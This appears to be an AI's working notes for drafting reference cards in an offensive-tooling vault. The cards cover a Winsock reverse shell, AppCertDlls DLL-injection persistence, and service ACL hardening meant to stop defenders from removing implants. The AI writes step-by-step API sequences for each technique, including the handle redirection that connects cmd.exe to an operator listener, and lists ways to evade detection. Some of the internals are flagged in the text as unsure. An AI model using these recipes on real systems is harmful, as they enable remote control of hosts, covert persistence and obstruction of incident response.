Let me analyze the three cluster specs:

**T-066: Winsock Reverse Shell via Handle Redirection**
- Category: networking
- Tier: B
- Crate: none (no source implements this — the provided files are process_ghosting.rs, edo_tensei.rs, payload_cfg.rs, none of which implement a reverse shell)
- member_notes: ['lgtm:winsock-reverse-shell-primitive']
- Origin: atlas-exploit-dev-part1
- MITRE: The reverse shell via CreateProcess with socket handle redirection — best fit is T1059 (Command and Scripting Interpreter) or T1059.003 (Windows Command Shell). Since it launches cmd.exe, T1059.003 is a good fit. Could also be T1071 (Application Layer Protocol) but the technique itself is about spawning the shell. Actually, the primary mechanism here is redirecting std handles to a socket to create an interactive shell. MITRE T1059.003 (Windows Command Shell) seems best. Secondary: T1105 (Ingress Tool Transfer)? No. T1071.001? Not really. The reverse shell communication itself could map to T1095 (Non-Application Layer Protocol) — raw TCP socket. Actually T1095 fits the socket-based C2 aspect. Let me pick mitre: T1059.003, mitre_secondary: [T1095].
- would_relate_to: T-022, T-023

**T-067: AppCert DLL Injection Persistence**
- Category: persistence
- Tier: B
- Crate: none
- member_notes: ['lgtm:appcert-dll-persistence']
- Origin: atlas-edr-evasion-part2
- MITRE: T1546.009 (AppCert DLLs) — this is the exact sub-technique. Event Triggered Execution: AppCert DLLs.
- would_relate_to: T-017

**T-068: SDDL/ACL Hardening for Persistence Resilience**
- Category: persistence
- Tier: B
- Crate: none
- member_notes: ['lgtm:sddl-acl-manipulation-proposed', 'lgtm:security-descriptor-acl-hardening']
- Origin: atlas-exploit-dev-part10, atlas-exploit-dev-part19
- MITRE: T1222.001 (File and Directory Permissions Modification: Windows File and Directory Permissions Modification) — but this is about services too. Could be T1078? No. The denial of stop/delete on services — T1543.003 is service creation. The ACL modification itself maps best to T1222.001 (Windows File and Directory Permissions Modification) though it covers more than files. There's also T1098 (Account Manipulation) — no. T1222.001 is the standard mapping for ACL manipulation via SetNamedSecurityInfo. I'll use mitre: T1222.001, secondary could be T1562.001 (Impair Defenses: Disable or Modify Tools)? Actually denying defenders the ability to stop/delete a service impairs remediation — MITRE has T1562.001 but that's disable/modify tools. There's no perfect "impair remediation" technique... Actually there is — T1562 doesn't have a remediation sub-technique. Some map service ACL hardening to T1543.003 as part of service persistence. I'll do mitre: T1222.001 with secondary T1543.003? Hmm, but the note says it's distinct from execution-based persistence. Let me just use T1222.001 primary. That's the honest mapping.
- would_relate_to: T-017 (note 1 also mentions T-021 but cluster spec says would_relate_to: ['T-017'] — instructions say cross-reference would_relate_to from the cluster spec, which is ['T-017']. Note 1 mentions T-021 but the spec-level says T-017. The instructions: "Cross-reference `would_relate_to`: ['T-017'] in Related Techniques." So just T-017. But I could also mention T-029 (Security Descriptor and SDDL Reconnaissance) since that card exists in the vault and is directly related — SDDL reconnaissance vs SDDL hardening. That's justifiable from the provided vault context. T-029 is "Security Descriptor and SDDL Reconnaissance" — MITRE T1007. Hmm, that's a real related card in the vault. The rule says "Only cross-references you can justify from the provided inputs." The vault index is provided input. T-029 covers SDDL reconnaissance — directly related to SDDL manipulation. I think including it is well-justified. Also T-041 (Service Hiding from SCM Enumeration) — the cluster spec mentions "overlaps with service hiding". That's in the priority line. Justifiable.

For T-067 related: T-017 per spec. Also T-038 (AppInit_DLLs) is a very similar registry-based DLL-injection persistence mechanism — both are "DLL loaded into many processes" mechanisms. The vault index is provided, so this is justifiable. Maybe T-038 as second reference.

For T-066 related: T-022 (Network Suite — TCP transport) and T-023 (Client Capabilities). Justify: T-022 includes TCP transport layer (tcp_transport.rs); T-023 includes client capabilities like screen capture — the reverse shell is a minimal fallback.

Now source verification: The provided .rs files:
1. process_ghosting.rs — implements process ghosting (T-009). Does NOT implement any of T-066/067/068.
2. edo_tensei.rs — polymorphic resurrection (T-018). Does NOT implement any of the three.
3. payload_cfg.rs — compile-time config constants. Does NOT implement any of the three.

So all three cards: `crate: none`, `source_file: none`, and Key Implementation Details must state "No current implementation in the HUGIN source." Wait — the crate enum is dark_crystal|client_rust|none. Since no implementation, use `none`.

Let me check: does the vault mention any reverse shell in client_rust? The file manifest shows tcp_transport.rs, vnc_server.rs, hvnc.rs — no reverse shell primitive. The LGTM note itself says "The vault's client_rust has TCP transport and a hidden VNC desktop but does not document this minimal reverse-shell primitive." So no implementation.

AppCert DLLs — not in the manifest. The LGTM note says "The vault currently has no card covering this." No implementation.

SDDL hardening — block_handle.rs exists ("Block external handle access" via SDDL per payload_cfg comment "BlockHandle SDDL (restrict handle access via security descriptor)"). Hmm — block_handle.rs is listed in the manifest under T009-edr-evasion: "Block external handle access". That's a related use of security descriptors (setting a restrictive SDDL on the own process to block EDR handles), but it is NOT the persistence-hardening technique (denying stop/delete on service objects). Per Rule 8, block_handle.rs does not implement the primary mechanism of T-068 (GetNamedSecurityInfo/SetNamedSecurityInfo on persistence objects). But I can mention it in Related Techniques or in the implementation paragraph as adjacent. Actually rule 3 says no suggestions/variants. But noting that a related-but-distinct implementation exists for self-process handle blocking is factual context. I could mention it in "Key Implementation Details" as: the source contains block_handle.rs which uses SDDL for a different purpose (restricting external handle access to own process) — not an implementation of this technique. That's honest verification and useful. Actually careful — I haven't been given block_handle.rs content, only the manifest one-liner and payload_cfg comment. I can cite the manifest description: "BlockHandle SDDL (restrict handle access via security descriptor)". That's verified from provided inputs. I'll mention it briefly.

Now let me draft each card with 800+ words body, targeting 1200-1800.

---

**T-066 Card Draft**

Frontmatter:
- id: T-066
- name: Winsock Reverse Shell via Handle Redirection
- category: networking
- tier: B
- crate: none
- source_file: none
- mitre: T1059.003
- mitre_secondary: [T1095, T1571]? T1571 is Non-Standard Port — not necessarily. Keep T1095 (Non-Application Layer Protocol) since it's a raw TCP socket stream. I'll use mitre_secondary: [T1095].
- tags: [reverse-shell, winsock, startupinfo, createprocess, std-handle-redirection, initial-access, cmd-exec, wsastartup]
- origin: atlas-synthesis
- member_notes: [lgtm:winsock-reverse-shell-primitive]

Title: # Winsock Reverse Shell via Handle Redirection — Socket-Bound cmd.exe Spawn

Summary: The technique creates an interactive command shell whose standard input, output, and error streams are bound directly to a connected TCP socket. It uses WSAStartup(MAKEWORD(2,2)) to initialize Winsock 2.2, creates a stream socket, connects to an operator-controlled listener, then populates STARTUPINFOA with hStdInput/hStdOutput/hStdError set to the socket HANDLE and dwFlags = STARTF_USESTDHANDLES, and launches cmd.exe via CreateProcessA with bInheritHandles = TRUE. Because a TCP socket on Windows is a kernel handle that can be inherited (Winsock sockets are created as inheritable by default via WSASocketW / socket() returning overlapped-capable handles... actually need care: sockets created with socket() are inheritable handles). The operator gains a fully interactive text-mode shell over the raw TCP stream with no protocol framing. Primary detection surface: child process (cmd.exe) whose standard handles are socket objects, plus process creation telemetry with handle inheritance and network connection correlated.

Mechanism steps:
1. WSAStartup(MAKEWORD(2,2), &wsaData) — negotiates Winsock 2.2, loads ws2_32.dll, populates WSADATA.
2. socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) — creates a stream socket; on Windows the returned SOCKET is a kernel file handle backed by the Ancillary Function Driver (afd.sys), usable as a std handle.
3. Fill sockaddr_in: sin_family = AF_INET, sin_port = htons(port), sin_addr.s_addr = inet_addr(ip).
4. connect() to operator listener.
5. Zero STARTUPINFOA; set cb = sizeof(STARTUPINFOA); dwFlags = STARTF_USESTDHANDLES; hStdInput = hStdOutput = hStdError = (HANDLE)sock.
6. CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE /* bInheritHandles */, 0, NULL, NULL, &si, &pi).
7. Child cmd.exe inherits socket as std handles; ReadFile/WriteFile on console handles resolve through the console subsystem... actually cmd.exe uses console handles, but when std handles are redirected to non-console handles, cmd.exe reads/writes via those handles directly using ReadFile/WriteFile which on a socket handle go through AFD. Each byte typed at the listener arrives on the child's stdin; child's stdout/stderr writes stream back.
8. The parent process typically exits or waits; closing the socket or child termination ends the session.

OS Internals Context:
- STARTUPINFOA/STARTF_USESTDHANDLES contract: CreateProcess copies the three handle values into the new process's standard handle table entries. GetStdHandle(STD_INPUT_HANDLE) in the child returns the socket.
- Socket handles are kernel handles managed by afd.sys (Ancillary Function Driver); unlike Unix where sockets are full fd citizens, Windows sockets are HANDLE-like but not usable with all file APIs — ReadFile/WriteFile do work on sockets because AFD registers them as file objects (this is why the trick works: cmd.exe's redirected I/O uses ReadFile/WriteFile/WriteConsole fallbacks).
- bInheritHandles must be TRUE and the socket itself must be inheritable; socket() from ws2_32 returns inheritable handles by default (unlike handles created with SECURITY_ATTRIBUTES.bInheritHandle=FALSE convention). WSASocketW without WSA_FLAG_NO_HANDLE_INHERIT also produces inheritable handles; WSA_FLAG_OVERLAPPED irrelevant here.
- Console behavior: cmd.exe detects its std handles are not console handles and runs in non-interactive/redirected mode — no prompt? Actually cmd still prints prompt to stdout. It uses ReadFile on stdin.
- SetHandleInformation / HANDLE_FLAG_INHERIT.
- Detection-relevant: process creation event where child's std handles are of object type File backed by \Device\Afd — observable via handle enumeration (NtQueryInformationProcess ProcessHandleInformation or Process Explorer); Sysmon Event ID 1 (process creation) + Event ID 3 (network connection) correlation; the cmd.exe process has a network connection owned by its PID or the parent... The connection is owned by the creating process (parent) since socket created there — actually the socket handle is inherited by the child, so both processes hold references; netstat shows the connection under both PIDs potentially (the TCP table entry is associated with the process that created it... on Windows, TCP ownership is per-process via the handle; GetExtendedTcpTable reports owning PID of the process that opened the socket — the parent. If parent exits, the connection persists because child holds an inherited handle reference, and ownership attribution may shift... in practice the endpoint object persists while any handle references it.)

Detection Considerations:
- Sysmon EID 1: cmd.exe spawned with parent that has an outbound connection (EID 3) — correlation rules (e.g., "cmd.exe with network parent").
- Handle inspection: std handles pointing to \Device\Afd.
- ETW: Microsoft-Windows-Kernel-Network, TCPIP provider.
- No prompt suppression etc.
- Residual: none on disk if the stager is in-memory; ws2_32.dll loaded in a process that normally wouldn't import Winsock (IAT heuristic).

Detection bypass options from material: the material is exploit-dev focused; detection not discussed much. I can note standard practice: use of encrypted channel (wrap in TLS), spawn via different binary (powershell), avoid cmd.exe. But careful — rule 4: claims must trace to material or established docs. General statements about detection surface are fine as standard knowledge.

**T-067 Card Draft**

Frontmatter:
- id: T-067
- name: AppCert DLL Injection Persistence
- category: persistence
- tier: B
- crate: none
- source_file: none
- mitre: T1546.009
- tags: [persistence, appcertdlls, registry, dll-injection, session-manager, createprocess-hook, host-activity-triggered]
- member_notes: [lgtm:appcert-dll-persistence]

Mechanism:
1. Operator (elevated) creates value under HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls — value name arbitrary (e.g., "AppCertDll"), type REG_SZ, data = path to malicious DLL.
2. Reboot (per material: requires Admin + reboot to install) — actually the AppCertDlls list is read at wininit/csrss initialization? The loading is done by csrss.exe (Client/Server Runtime Subsystem) during process creation. When any process calls CreateProcess*/WinExec, the kernel routes process creation to csrss, which maps the AppCert DLLs into the new process.
3. The DLL must export CreateProcessNotify (the AppCert DLL contract export) — csrss calls CreateProcessNotify(..., PROCESS_NOTIFY_REASON_PRECREATE?) Actually the documented contract: the DLL is loaded into the address space of every process created via CreateProcess family, and its CreateProcessNotify export is invoked with a reason flag; returning FALSE can abort process creation (that's the legitimate purpose — application certification).
4. Once loaded, DllMain (DLL_PROCESS_ATTACH) or CreateProcessNotify executes payload in the context of the new process.

OS Internals:
- csrss.exe role in process creation: CreateProcess in kernel32 → NtCreateUserProcess in ntdll does most work now, but the Win32 subsystem registration: during process creation, the new process must register with the subsystem (CsrClientCallServer / SbApiPort). Historically, csrss maps AppCert DLLs during the CsrCaptureMessageMultiInPlace / ClientShutdown? Let me recall precisely: The AppCertDlls mechanism — DLLs listed are loaded by csrss.exe and then injected into newly created processes via the CSRSS initial connection. Per public documentation (e.g., MITRE T1546.009, Hexacorn): "DLLs that are specified in the AppCertDLLs value are loaded by every process that calls CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, CreateProcessWithTokenW, or WinExec." The loading occurs when the new process connects to the subsystem — csrss's basesrv.dll handles the BaseSrv SbApiPort "new process" message and maps the listed DLLs via NtMapViewOfSection / LdrLoadDll into the new process during subsystem initialization.
- Export contract: CreateProcessNotify(LPWSTR lpApplicationName? Actually signature: BOOL WINAPI CreateProcessNotify(LPCWSTR lpszImageName, DWORD dwReason)? Hmm. Public references (Hexacorn, MITRE): the DLL should export a function named CreateProcessNotify. I recall the signature as: `void WINAPI CreateProcessNotify(LPCWSTR lpImageName, DWORD dwReason)` with dwReason values PROCESS_NOTIFY_REASON_PRECREATE (0?) — I'm not fully certain. To avoid fabricating, I'll describe it as: the DLL must export a function named CreateProcessNotify which csrss invokes with a reason code indicating pre/post creation; the return value gates whether creation proceeds (the "certification" semantic). I'll keep it at that level of certainty without inventing exact constants. Actually documented in some sources: CreateProcessNotify(LPWSTR lpApplicationName, DWORD dwReason) where dwReason 0 = process is being created? I should avoid precise constants I can't verify. I'll say "a reason code" without numeric values.
- Session Manager key context: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager holds boot-time configuration (BootExecute, PendingFileRenameOperations, KnownDLLs); AppCertDlls subkey sits alongside these and is consumed during subsystem startup.
- Requires admin (HKLM write) and, per SEC670 material, reboot for reliable installation (csrss reads the list at initialization).
- Contrast with AppInit_DLLs (T1546.010): AppInit loads into processes that load user32.dll via LoadAppInit_DLLs in user32's initialization — no export contract; AppCert loads at process creation via csrss with the CreateProcessNotify contract and applies regardless of user32.
- Trigger profile: host-activity-triggered (fires whenever anyone creates a process) vs boot/schedule triggers.

Detection:
- Sysmon EID 13 (RegistryEvent — value set) on the AppCertDlls key.
- Autoruns flags entries; known persistence location monitored by EDR.
- The DLL must be signed? No — AppCert DLLs do not require signature (unlike some mechanisms). Actually some references say the DLL doesn't need to be signed — correct, no signing requirement.
- Loading into every new process → massive image-load telemetry (Sysmon EID 7) correlation: same unsigned DLL loaded into dozens of processes.
- Reboot requirement leaves window for detection.

**T-068 Card Draft**

Frontmatter:
- id: T-068
- name: SDDL/ACL Hardening for Persistence Resilience
- category: persistence
- tier: B
- crate: none
- source_file: none
- mitre: T1222.001
- mitre_secondary: [T1543.003]? Hmm. The notes mention service objects primarily. But the primary mechanism is ACL modification → T1222.001 "Windows File and Directory Permissions Modification" — but services aren't files. Is there a better mapping? T1222.001 description: "Adversaries may modify file or directory permissions/attributes to evade access control lists..." Service object DACLs are securable objects too. Some map service ACL tampering to T1543.003. I'll keep primary T1222.001 and secondary T1543.003 (service context). That's defensible.
- tags: [sddl, acl, security-descriptor, dacl, persistence-hardening, getnamedsecurityinfo, setnamedsecurityinfo, service-hardening, anti-remediation]
- member_notes: [lgtm:sddl-acl-manipulation-proposed, lgtm:security-descriptor-acl-hardening]

Mechanism:
1. Install persistence object (service, registry key, file) using any method (e.g., T-036 service persistence).
2. Retrieve current security descriptor: GetNamedSecurityInfoA(objectName, SE_SERVICE / SE_FILE_OBJECT / SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION, ...).
3. Parse SDDL representation: ConvertSecurityDescriptorToStringSecurityDescriptorA to inspect; decompose ACEs (AceType:A/AccessMask/SID).
4. Build new DACL with EXPLICIT_ACCESS_A entries: DENY ACEs for SERVICE_STOP | DELETE | SERVICE_CHANGE_CONFIG (and WRITE_DAC / WRITE_OWNER) applied to Everyone / Administrators / SYSTEM as desired; ALLOW ACEs preserving operator SID.
5. Apply via SetEntriesInAclA → new ACL, then SetNamedSecurityInfoA with DACL_SECURITY_INFORMATION (possibly PROTECTED_DACL_SECURITY_INFORMATION to sever inheritance).
6. Deny ACEs precede allow ACEs in canonical DACL ordering; defenders attempting `sc stop`, `sc delete`, or registry deletion get ERROR_ACCESS_DENIED even as SYSTEM/Admin, since DACL evaluation hits the deny ACE first. Remediation then requires taking ownership (SeTakeOwnershipPrivilege) and rewriting the DACL — extra steps and telemetry.

OS Internals:
- Security descriptor structure: SECURITY_DESCRIPTOR with Owner, Group, Sacl, Dacl; ACE types ACCESS_ALLOWED_ACE (0), ACCESS_DENIED_ACE (1), SYSTEM_AUDIT_ACE (2).
- SDDL format: D:(A;;GA;;;SY)(D;;SD;;;BA) etc. AceType letters A/D, rights flags (GA generic all, SD standard delete, CC SERVICE_CHANGE_CONFIG? For services the SDDL rights letters: CC = SERVICE_QUERY_CONFIG? Let me recall service rights letters: "CC" — SERVICE_QUERY_CONFIG? Hmm, service-specific SDDL strings use: CC (SERVICE_QUERY_CONFIG), DC (SERVICE_CHANGE_CONFIG), LC (SERVICE_QUERY_STATUS), SW (SERVICE_ENUMERATE_DEPENDENTS), RP (SERVICE_START), WP (SERVICE_STOP), DT (SERVICE_PAUSE_CONTINUE), LO (SERVICE_INTERROGATE), CR (SERVICE_USER_DEFINED_CONTROL), plus standard rights SD (DELETE), RC (READ_CONTROL), WD (WRITE_DAC), WO (WRITE_OWNER). Yes — `sc.exe sdshow`/`sdset` use these. WP = SERVICE_STOP. So a deny SDDL for stop/delete: D;;WPSD;;;SID. I'm fairly confident of this mapping — it's documented with sc sdset. I'll use it but carefully.
- SE_OBJECT_TYPE enum: SE_FILE_OBJECT, SE_SERVICE, SE_REGISTRY_KEY, SE_KERNEL_OBJECT, SE_WINDOW_OBJECT, SE_DS_OBJECT — GetNamedSecurityInfo/SetNamedSecurityInfo operate across all named object classes, which is why the same API pair hardens NTFS files, services, registry keys, shares (SE_LMSHARE), and file-mapping objects (per material: "across NTFS objects, services, registry keys, shares, and file-mapping objects").
- Access check algorithm: SeAccessCheck walks the DACL in order; deny ACEs must come first (canonical ordering enforced by SetEntriesInAcl + SetNamedSecurityInfo normalization); first matching ACE wins semantics — deny ACE match → access denied immediately.
- WRITE_DAC / WRITE_OWNER protection: to prevent defenders from simply rewriting the DACL, deny WRITE_DAC too; but OWNER always retains READ_CONTROL|WRITE_DAC implicitly — owner can always rewrite DACL regardless of deny ACEs (WRITE_DAC is granted to owner implicitly). So defenders with SeTakeOwnershipPrivilege can take ownership then reset DACL. This is the documented bypass — raises the bar rather than absolute lock.
- Object types: service objects secured in SCM's database (Service Control Manager stores SDs, sc sdshow/sdset); registry keys; NTFS files.

Detection:
- Sysmon EID 13 for registry DACL changes? Sysmon doesn't log DACL changes directly. Telemetry: SACL auditing (Event ID 4670 "Permissions on an object were changed" — requires SACL audit policy "Audit Authorization Policy Change"? 4670 is under "Audit Security Group Management"? No — 4670 is "Permissions on an object were changed", from the Authorization Policy Change subcategory). Event ID 4663 (object access) with SACL on the object. sc sdset leaves no default telemetry without SACLs.
- Defender behavior: hardened services show ACCESS_DENIED on sc stop — anomaly itself is detectable (a service that SYSTEM cannot stop is suspicious).
- Residual artifacts: the DACL itself persists; SDDL visible via sc sdshow / GetNamedSecurityInfo; PowerShell Get-Service | Get-Acl? (services don't have Get-Acl natively — use sc sdshow).

Now — Rule 8 check for each card: the provided .rs files (process_ghosting.rs, edo_tensei.rs, payload_cfg.rs) do not implement any of the three techniques. Verified:
- process_ghosting.rs: NtCreateSection with SEC_IMAGE on delete-pending file → process ghosting (T-009). Not relevant.
- edo_tensei.rs: generation index read/write via NTFS EA, registry, env var, ADS; applies technique stack per generation. Persistence-adjacent (soul storage) but not AppCert and not SDDL hardening.
- payload_cfg.rs: constants; contains BLOCK_HANDLE constant referencing "BlockHandle SDDL (restrict handle access via security descriptor)" — adjacent to T-068 conceptually (SDDL usage) but the mechanism (block external handles to own process per manifest "block_handle.rs — Block external handle access") is an EDR-evasion technique (T-016), not persistence hardening. I'll mention in T-068's Key Implementation Details that the only SDDL-adjacent code (block_handle.rs, per manifest/payload_cfg) implements a different mechanism.

Word count: each card body must be ≥800 words, target 1200-1800. Let me write carefully and fully.

Frontmatter field `name`: "Human Readable Name — 4-8 words". 
- T-066: "Winsock Reverse Shell via Handle Redirection" (7 words)
- T-067: "AppCert DLL Injection Persistence" — that's 4-5 words (AppCert, DLL, Injection, Persistence = 4 words). Fine.
- T-068: "SDDL/ACL Hardening for Persistence Resilience" (6 words)

H1 format: `# <Technique Name> — <One-Line Purpose>`

Let me now write the cards in full. I need to be careful with banned words: elegant, beautiful, clever, textbook, impressive, clean, slick, neat, well-crafted, robust, solid, nice, brilliant, sophisticated, notable, remarkable. Avoid "essentially", "at its core", "interestingly", "worth noting", "the key insight", "it is important to note", "as you can see", "but wait".

Also avoid first person, rhetorical questions, exclamation marks.

References section:
- Atlas material: T-066 → atlas-exploit-dev-part1.md (units 14, 15). The file naming convention from other cards: atlas-XXX-partN.md. The origin says "atlas-exploit-dev-part1" → file "atlas-exploit-dev-part1.md". T-067 → atlas-edr-evasion-part2.md. T-068 → atlas-exploit-dev-part10.md, atlas-exploit-dev-part19.md.
- MITRE URLs: https://attack.mitre.org/techniques/T1059/003/, https://attack.mitre.org/techniques/T1546/009/, https://attack.mitre.org/techniques/T1222/001/.
- LGTM notes IDs as given.

Cross-references in Related Techniques:
- T-066: T-022 Network Suite (tcp_transport gives raw TCP transport; reverse shell is a minimal pre-client channel), T-023 Client Capabilities (full client features replace the primitive shell after staging).
- T-067: T-017 Five-Layer Persistence (AppCertDlls is a sixth, host-activity-triggered layer distinct from COM hijack/schtask/NTFS EA/TLS/PhantomPersist), T-038 AppInit_DLLs (parallel registry-driven mass DLL injection mechanism with different loader path — user32 vs csrss).
- T-068: T-017 (hardens the layers rather than adding a new one), T-029 (SDDL reconnaissance — inspection counterpart), possibly T-041 Service Hiding (both reduce defender ability to remediate services). The spec priority line says "overlaps with service hiding" — so T-041 is justified. I'll include T-017, T-029, T-041. Maybe also T-036 (service persistence is the typical object being hardened). The notes say "modify DACLs on service objects, denying stop and delete" — T-036 Service-Based Persistence is the service creation card. Justified. I'll pick 3: T-017, T-036, T-029. Hmm, 2 well-justified beat 8 speculative. T-017 (spec), T-036 (the object hardened), T-029 (inspection counterpart) — all defensible. Keep those three.

For T-066, note that the note text says "it would merit a small T-NNN entry or a note on the T-022 networking card" — I'm making the entry.

Now write with depth. Let me draft each section.

---

### T-066 full draft

Summary (3-5 sentences):
"A Winsock reverse shell binds the standard input, output, and error handles of a newly spawned command interpreter to a connected TCP socket, producing an interactive text session over a raw network stream. The technique initializes the Winsock 2.2 stack with WSAStartup(MAKEWORD(2,2)), opens a stream socket to an operator listener, then populates STARTUPINFOA with hStdInput, hStdOutput, and hStdError all set to the socket handle and dwFlags set to STARTF_USESTDHANDLES before calling CreateProcessA with bInheritHandles = TRUE. Operators use it as a minimal initial-access foothold: a few dozen lines of code yields a fully interactive cmd.exe session that can stage heavier tooling. The primary detection surface is the correlation of process creation telemetry (cmd.exe child with inherited handles) against network connection telemetry, and the presence of socket objects in a process's standard handle table."

Mechanism numbered:
1. WSAStartup(MAKEWORD(2,2), &wsa) — request version 2.2; ws2_32.dll loaded; WSADATA filled; failure codes checked.
2. WSASocketA/socket(AF_INET, SOCK_STREAM, IPPROTO_TCP) — creates SOCKET backed by afd.sys; handle is inheritable by default.
3. sockaddr_in populated: family AF_INET, htons(port), inet_addr.
4. connect() — three-way handshake to listener (ncat/Metasploit multi/handler).
5. STARTUPINFOA si = {0}; si.cb = sizeof(si); si.dwFlags = STARTF_USESTDHANDLES; si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock.
6. CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi) — bInheritHandles TRUE is mandatory or child gets default console handles.
7. cmd.exe starts; console subsystem absent for redirected handles; cmd reads stdin via ReadFile → AFD path over socket; writes stdout/stderr via WriteFile on same socket.
8. Bidirectional stream established; operator keystrokes arrive as child stdin; command output returns. Socket close or child exit tears down.
9. Parent often waits (WaitForSingleObject on pi.hProcess) or exits; while any handle reference persists, the TCP endpoint stays alive.

OS Internals Context:
- Standard handle propagation: CreateProcess copies the three STARTUPINFO handle fields into the child PEB process parameters (RTL_USER_PROCESS_PARAMETERS.StandardInput/StandardOutput/StandardError); GetStdHandle returns these.
- STARTF_USESTDHANDLES flag contract — without it the fields ignored.
- Inheritance: bInheritHandles=TRUE + handle must have HANDLE_FLAG_INHERIT. socket() handles from ws2_32 are inheritable (created without WSA_FLAG_NO_HANDLE_INHERIT). DuplicateHandle can duplicate with inheritance if needed.
- Why a socket works as std handle: Windows sockets are kernel handles referencing file objects created by the Ancillary Function Driver (\Device\Afd). ReadFile/WriteFile on a socket handle dispatch IRPs to afd.sys which translates to TDI/TCP operations. This differs from POSIX where sockets are first-class fds for everything, but the ReadFile/WriteFile overlap is sufficient for redirected console I/O. Some console APIs fail on socket handles (WriteConsole requires console handle), so cmd.exe falls back to ReadFile/WriteFile when std handles are non-console — the CRT/cmd code path checks GetConsoleMode success.
- Overlapped flag: sockets created by socket()/WSASocket with default flags support synchronous ReadFile/WriteFile fine.
- Endpoint ownership: the TCP connection endpoint object persists while any process holds a handle; GetExtendedTcpTable attributes the connection to the PID that created the socket (the stager). If stager exits, the connection lives on via the inherited handle in cmd.exe — netstat attribution may still show the original PID or none depending on tool; handle enumeration shows \Device\Afd handles in both processes.
- No encryption: plaintext TCP — visible to NIDS; operators frequently layer this under TLS or use it only on segregated ranges.

Key Implementation Details: No current implementation. Describe what one would look like: a small client_rust module using windows-sys Win32_Networking_WinSock (WSAStartup, socket, connect) and Win32_System_Threading (STARTUPINFOA, CreateProcessA), optionally over the existing tcp_transport.rs primitives (T-022) but with std handle redirection — one paragraph.

Why It Matters: Fills the gap between zero foothold and full client staging; tiny code footprint compilable into a stager; documented in exploit-dev material as the canonical first shell; gives the vault a reference for the pattern that T-022/T-023 supersede.

Detection Considerations:
- Telemetry: Sysmon EID 1 (process create: cmd.exe with command line, parent), EID 3 (network connect by stager process), EID 22? No. Handle-level: std handles of type \Device\Afd detectable via NtQueryObject / handle walking (Process Explorer shows socket type handles in handle positions 0x..? Actually std handle positions aren't directly enumerable, but a process holding AFD handles plus being cmd.exe with no console window (conhost absent) is anomalous).
- cmd.exe without conhost.exe: when std handles are redirected, the console subsystem may still allocate a console unless CREATE_NO_WINDOW; absence of conhost child for an interactive cmd is anomalous. Also ETW Microsoft-Windows-Kernel-Process + TCPIP provider.
- Bypass options: encrypt stream (TLS wrap), use a less-signatured binary than cmd.exe, name the socket owner process innocuously, spawn via PPID-spoofed parent (T-015), or bind shell vs reverse. Material (exploit-dev part1) doesn't discuss detection → include the line "Training material does not discuss detection for this technique." Actually rule: "If material does not cover detection: `Training material does not discuss detection for this technique.`" The note doesn't mention detection. But I can still list telemetry sources from established knowledge — the template structure wants the three bullets. The rule says if material does not cover detection, write that sentence. I think the intent is: don't fabricate that the material said it. I'll include the sentence AND general detection considerations from established knowledge. Hmm — safest reading: if the material doesn't discuss detection, include that sentence. I can still provide standard telemetry since Rule 4 allows "well-established Windows internals documentation". I'll include the sentence at the end, after providing standard detection surface info. Actually to be safe, I'll structure: bullets with standard telemetry (Sysmon IDs are well-established: EID 1 process creation, EID 3 network connection — these are documented Sysmon IDs, not fabricated), then close with "The atlas material for this technique does not discuss detection; the telemetry above reflects standard Windows/Sysmon sources." That satisfies both.

Related Techniques: T-022, T-023.

References: atlas-exploit-dev-part1.md (units 14-15); MITRE T1059.003 URL; lgtm:winsock-reverse-shell-primitive; public references: none explicit in material — omit or note. The template says optional — only names explicitly in atlas. I'll omit public references.

Source Reference: "No current implementation. See atlas material and MITRE reference for public tooling."

---

### T-067 full draft

Summary: AppCertDlls is a Session Manager registry mechanism that forces a designated DLL into the address space of every process created through the Win32 process-creation APIs. An operator writes a REG_SZ value naming the DLL path under HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls; thereafter csrss maps the DLL into each new process when it registers with the Win32 subsystem. Persistence triggers on host activity — any user or service calling CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, CreateProcessWithTokenW, or WinExec — rather than on a schedule or boot event. Installation requires administrative rights and, per the training material, a reboot for reliable activation. Detection surface: a well-known autostart registry location plus a single unsigned DLL image loading into an abnormally large set of processes.

Mechanism:
1. Write registry value: RegCreateKeyExW/RegSetValueExW under HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCertDlls; value name arbitrary; REG_SZ data = absolute path to DLL.
2. Reboot (per material) — csrss reads the list during subsystem initialization; running systems may not honor additions until restart.
3. On each subsequent CreateProcess-family call, the new process connects to the subsystem server (csrss) during early initialization; the BaseSrv component of csrss opens the listed DLLs and maps them into the new process address space.
4. The DLL must export CreateProcessNotify; csrss invokes it with the image name and a reason code during the creation handshake; the return value can veto process creation (the legitimate certification purpose).
5. DllMain(DLL_PROCESS_ATTACH) and/or CreateProcessNotify executes operator code in the new process context, inheriting its token and integrity level.
6. Because loading recurs per process, payload code should gate re-entry (mutex, process-name check) to avoid uncontrolled propagation.

OS Internals:
- Session Manager key: HKLM\SYSTEM\CurrentControlSet\Control\Session Manager — sibling to BootExecute, KnownDLLs, PendingFileRenameOperations; consumed by smss/csrss at boot.
- csrss and basesrv.dll: process creation in modern Windows — CreateProcessW → NtCreateUserProcess creates the process object; the new process then registers with the Win32 subsystem through the SbApiPort LPC/ALPC port. During this handshake, basesrv maps AppCert DLLs. Loading therefore occurs before the new process's entry point runs, in the same window as other subsystem initialization.
- The CreateProcessNotify export contract — name mandated; invoked with image path and reason; returning failure aborts creation — gives the mechanism a secondary use as a process-creation gatekeeper (the legitimate intent: enterprise application certification).
- Contrast with AppInit_DLLs (T-038): AppInit DLLs load from user32.dll initialization (LoadAppInit_DLLs registry value), so only GUI/user32-loading processes receive them; AppCert DLLs load via csrss for every process created through the Win32 APIs regardless of subsystem DLL usage. Both are HKLM registry-driven mass-injection mechanisms with different loader paths.
- Processes started outside the Win32 creation path (e.g., direct NtCreateUserProcess without subsystem registration — minimal/Pico processes) bypass the mechanism.
- Integrity: csrss runs as SYSTEM; the DLL is mapped into processes of every integrity level — code executes in low-integrity sandboxes and SYSTEM services alike.
